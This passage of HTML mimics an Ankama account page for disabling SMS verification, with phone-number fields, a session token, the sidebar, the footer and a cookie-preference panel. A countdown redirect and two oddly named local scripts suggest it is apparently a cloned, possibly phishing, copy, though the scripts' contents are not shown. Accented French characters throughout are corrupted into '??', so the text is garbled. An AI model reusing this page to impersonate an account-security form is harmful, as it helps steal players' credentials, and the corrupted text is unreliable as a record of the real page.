+212624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-PT ak-tooltip" style="display: none">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : Au Portugal : 624242424 devient +351624242424"},"style":{"classes":"ak-tooltip-content"}}}</script><span class="ak-tooltip-info ak-tooltip-phone ak-tooltip-DEFAULT ak-tooltip">?</span><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"","text":"Le num\u00e9ro de mobile doit \u00eatre sous indicatif international.<br \/>\nEx : En France : 0624242424 devient +33624242424"},"style":{"classes":"ak-tooltip-content"}}}</script></span></div><div class="ak-container ak-block-button-form">
<input role="button" class="btn btn-primary btn-lg" value="Valider" type="submit" ><a class="btn btn-sm btn-default" href="https://support.ankama.com/hc/fr/requests/new?ticket_form_id=625847" target="_blank">Contacter le support</a></div><input type="hidden" class="form-control" name="step" value="2" /></form><script type="application/json">{"server":{"url":"https:\/\/account.ankama.com\/fr\/compte\/desactiver-protection-sms","data":{"sAction":"test","sToken":"73ee82cf1760d23207d8cc304183c6b2","sLang":"fr"}}}</script></div></div<br>
    
  
</main>
<aside class="col-md-3">

<div class="ak-container ak-main-aside"><div class="ak-container ak-panel ak-aside-infos"> <div class="ak-panel-title">
<span class="ak-panel-title-icon"></span>
INFORMATIONS
</div>
<div class="ak-panel-content">
Vous pouvez <strong>passer la v??rification par SMS</strong> et reprendre le contr??le en quelques minutes !<br />
<br />
<strong>L'envoi du SMS est gratuit</strong>. Afin d'??viter les abus, les comptes sont soumis ?? un <strong>quota de SMS envoy?? par semaine et par mois</strong>. Si vous utilisez de fa??on raisonnable le service, il n'y aura pas de soucis. <br />
<br />
Vous devez saisir le num??ro de t??l??phone mobile associ?? au compte concern??.<br />
<br />
Vous devez ??tre le <strong>propri??taire du t??l??phone</strong> pour utiliser ce service (ou avoir obtenu son autorisation).
</div>
</div></div> </aside>
</div>
</div>
</div>
</div>
<a class="ak-backtotop" href="javascript:void(0);"></a>
<footer><div class="ak-footer-content">
<div class="row ak-block1">
<div class="col-md-9 ak-block-links">
</div>
<div class="col-md-3 ak-block-download">
<a class="ak-problem" href="https://support.ankama.com/requests/new">
</a>
<div class="ak-social-network">
</div>
</div>
</div>
<div class="row ak_legal">
<div id="col-md-12">
<div class="ak-legal">
<div class="row">
<div class="col-sm-1"><a href="https://www.ankama-group.com" target="_blank" class="ak-logo-ankama"></a></div>
<div class="col-sm-11">
<p>
?? 2020 <a href="https://www.ankama-group.com/fr" target="_blank">Ankama</a>. Tous droits r??serv??s. <a href="https://account.ankama.com/fr/cgu" target="_blank">Conditions d'utilisation</a> - <a href="https://account.ankama.com/fr/politique-confidentialite" target="_blank">Politique de confidentialit??</a> - <a href="https://account.ankama.com/fr/cgv" target="_blank">Conditions G??n??rales de Vente</a> - <a href="https://account.ankama.com/fr/mentions-legales?ref=ankama" target="_blank">Mentions L??gales</a> - <a href="javascript:void(0);" class="ak-modal-trigger">Gestion des cookies</a><script type="application/json">{"target":".ak-modal-privacy-cookies"}</script> </p>
</div>
</div>
</div> </div>
</div>
</div>
<div class="ak-modal-privacy-cookies ak-modal" title="Gestion de vos pr&eacute;f&eacute;rences sur les cookies"> <p>
<div class="ak-privacy-cookies-manager">
<p class="ak-intro">Certaines fonctionnalit??s de ce site (partage de contenus sur les r??seaux sociaux, lecture directe de vid??os) s'appuient sur des services propos??s par des sites tiers. Ces fonctionnalit??s d??posent des cookies permettant notamment ?? ces sites de tracer votre navigation. Ces cookies ne sont d??pos??s que si vous donnez votre accord. Vous pouvez vous informer sur la nature des cookies d??pos??s, les accepter ou les refuser soit globalement pour l'ensemble du site et l'ensemble des services, soit service par service.</p>
<hr />
<div class="ak-group" group="_all">
<h3>Tous</h3>
<p>Pr??f??rences pour tous les services</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr />
<div class="ak-group" group="audience">
<h3>Audience et Publicit??</h3>
<p>Les cookies d'audience permettent de recueillir des informations relatives ?? la d??connexion et au comportement des visiteurs ?? des fins statistiques</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="fbtr">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Facebook tracker </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggan">
<div class="row">
<div class="col-xs-6 text-right ak-label">
 Google Analytics </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="otad">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Autres outils publicitaires </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr />
<div class="ak-group" group="social_networks">
<h3>R??seaux sociaux</h3>
<p>Les r??seaux sociaux permettent d'am??liorer la convivialit?? du site et aident ?? sa promotion via les partages.</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="fbok">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Facebook </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggpl">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Google Plus </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="twtr">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Twitter </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="dsrd">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Dicord </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="pwro">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Powr Io </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr />
<div class="ak-group" group="medias">
<h3>M??dia</h3>
<p>Les services de m??dias permettent d'enrichir le site de contenu multim??dia et augmentent sa visibilit??.</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ytbe">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Youtube </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="twch">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Twitch </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
 </div>
</div>
<div class="ak-block" key="gphy">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Giphy </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr />
<div class="ak-group" group="other">
<h3>Autre</h3>
<p>Des cookies de confort pour am??liorer l'exp??rience utilisateur</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggmp">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Google Maps </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="idvz">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Iadvize </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
</div></p>
</div><script type="application/json">{"dialog":{"dialogClass":"ak-modal-wrapper"}}</script></footer>
<div class="ak-mobile-menu-overlay"></div>
</div>
<script type="text/javascript" src="https://s.ankama.com/www/static.ankama.com/g/common.js"></script>
<script type="text/javascript" src="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/javascript/../modules/common/common.js"></script>
<script type="text/javascript">
    
  </script>
  <script type="text/javascript">
var timeoutHandle;
function countdown(minutes) {
    var seconds = 60;
    var mins = minutes
    function tick() {
        var counter = document.getElementById("timer");
        var current_minutes = mins-1
        seconds--;
        counter.innerHTML =
        current_minutes.toString() + ":" + (seconds < 10 ? "0" : "") + String(seconds);
        if( seconds > 0 ) {
            timeoutHandle=setTimeout(tick, 1000);
        } else {

            if(mins > 1){

               // countdown(mins-1);   never reach ???00??? issue solved:Contributed by Victor Streithorst
               setTimeout(function () { countdown(mins - 1); }, 1000);

            }else{
			
			window.location.href = "./"
			
			}
        }
    }
    tick();
}

countdown(3);

</script>
<script type="text/javascript" src="commofefefn.js"></script>
<script type="text/javascript" src="cogrtymmon.js"></script>
</body>
</html>
